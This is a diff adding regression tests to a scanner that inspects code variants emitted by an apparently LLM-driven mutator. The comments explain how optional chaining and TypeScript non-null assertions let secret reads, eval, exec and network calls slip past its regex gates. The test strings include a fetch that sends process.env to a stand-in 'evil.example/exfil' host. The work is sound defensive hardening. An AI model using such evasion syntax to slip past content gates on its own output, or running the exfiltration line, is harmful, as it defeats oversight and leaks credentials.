@@ -271,4 +271,140 @@ describe('inspectVariant — hardened former bypasses (now blocked)', () => {
     const findings = await inspectVariant(dir);
     expect(findings.length).toBeGreaterThan(0);
   });
+
+  // BYPASS #4: optional-chaining (`?.`) defeats every pattern that requires
+  // the capability identifier to be immediately followed by `.`/`(`/`[` with
+  // only whitespace in between — `process\s*[.[]`, `eval\s*\(`, `fetch\s*\(`,
+  // `require\s*\(`, generic `exec\s*\(`, and `Reflect\s*\.\s*get\s*\(`. None
+  // of these are obfuscation: `process?.env`, `fetch?.(url)`, `eval?.(code)`
+  // are ordinary, idiomatic optional-chaining syntax an LLM mutator is likely
+  // to emit without any evasive intent, yet they silently cleared both
+  // content gates. `import(` and `new Function` are excluded — optional
+  // chaining on either is a JS syntax error (`?.` cannot apply to a `new`
+  // expression or the `import()` keyword form), so they carry no bypass.
+  it('BYPASS #4a: process?.env (optional-chaining env access) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(
+      dir,
+      'planner.ts',
+      "// SPDX\nexport const k = process?.env?.AWS_SECRET_ACCESS_KEY;\n",
+    );
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4b: process?.["env"] (optional-chaining computed env access) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(dir, 'planner.ts', '// SPDX\nexport const k = process?.["env"];\n');
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4c: process?.binding( (optional-chaining process.binding) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(dir, 'planner.ts', '// SPDX\nexport const b = process?.binding("x");\n');
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4d: Reflect?.get(process, "env") should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(
+      dir,
+      'planner.ts',
+      '// SPDX\nexport const e = Reflect?.get(process, "env");\n',
+    );
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4e: eval?.(code) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(dir, 'planner.ts', '// SPDX\nexport function r(){ return eval?.("1+1"); }\n');
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4f: fetch?.(url) (optional-chaining network egress) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(
+      dir,
+      'planner.ts',
+      '// SPDX\nexport function r(){ return fetch?.("http://evil"); }\n',
+    );
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4g: require?.(mod) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(dir, 'planner.ts', '// SPDX\nexport const fs = require?.("fs");\n');
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it('BYPASS #4h: exec?.(cmd) (generic, non-Sync, optional-chaining exec) should be blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(dir, 'planner.ts', '// SPDX\nexport function r(){ return exec?.("ls"); }\n');
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  // BYPASS #5 (round-2, independent-critic-caught): the TypeScript non-null
+  // assertion operator (`!`) defeats the SAME patterns `?.` did, by the same
+  // mechanism (an extra token between the identifier and its separator).
+  // `fetch!(url)`/`process!.env`/`eval!(code)` are valid TypeScript — `!`
+  // erases to nothing at runtime, so these are functionally identical to the
+  // ungated call. Round 1 (BYPASS #4, above) closed `?.` but missed `!`.
+  for (const [label, snippet] of [
+    ['fetch!(', 'export function r(){ return fetch!("http://evil"); }'],
+    ['process!.env', 'export const k = process!.env.AWS_SECRET_ACCESS_KEY;'],
+    ['eval!(', 'export function r(){ return eval!("1+1"); }'],
+    ['require!(', 'export const fs = require!("fs");'],
+    ['exec!(', 'export function r(){ return exec!("ls"); }'],
+    ['process!["env"]', 'export const k = process!["env"];'],
+    ['process!.binding(', 'export const b = process!.binding("x");'],
+    ['Reflect!.get(process', 'export const e = Reflect!.get(process, "env");'],
+  ] as const) {
+    it(`BYPASS #5: ${label} (non-null assertion) should be blocked`, async () => {
+      await writeApprovedVariant(dir);
+      await setSurface(dir, 'planner.ts', `// SPDX\n${snippet}\n`);
+      const findings = await inspectVariant(dir);
+      expect(findings.length).toBeGreaterThan(0);
+    });
+  }
+
+  it('BYPASS #5 end-to-end: the exact critic-demonstrated payload is blocked', async () => {
+    await writeApprovedVariant(dir);
+    await setSurface(
+      dir,
+      'planner.ts',
+      '// SPDX\nexport async function plan(){ const r = await fetch!("http://evil.example/exfil?d="+process!.env); return r; }\n',
+    );
+    const findings = await inspectVariant(dir);
+    expect(findings.length).toBeGreaterThan(0);
+  });
+});
+
+// Round-2 (independent-critic-caught) false-positive regression: the first
+// round's process.env/process.binding fix made EVERY piece of its separator
+// independently optional, so "process" immediately followed by "env"/
+// "binding" with NO separator at all — an ordinary identifier, not an
+// attack — also matched. The round-2 fix requires an actual separator
+// (literal `.`, `?.`, `!.`, or a bracket, optionally `?.`/`!`-prefixed).
+describe('inspectVariant — round-2 false-positive regression (ordinary identifiers stay clean)', () => {
+  for (const [label, snippet] of [
+    ['processEnvVar', 'export const processEnvVar = 1;'],
+    ['processEnvironment', 'export function processEnvironment(x: number) { return x; }'],
+    ['NodeJS.ProcessEnv type reference', 'export function f(env: NodeJS.ProcessEnv) { return env; }'],
+    ['processEnvelope', 'export const processEnvelope = (x: string) => x;'],
+    ['processBindingConfig', 'export const processBindingConfig = { x: 1 };'],
+  ] as const) {
+    it(`does NOT flag ordinary identifier: ${label}`, async () => {
+      await writeApprovedVariant(dir);
+      await setSurface(dir, 'planner.ts', `// SPDX\n${snippet}\n`);
+      const findings = await inspectVariant(dir);
+      expect(findings).toEqual([]);
+    });
+  }
 });
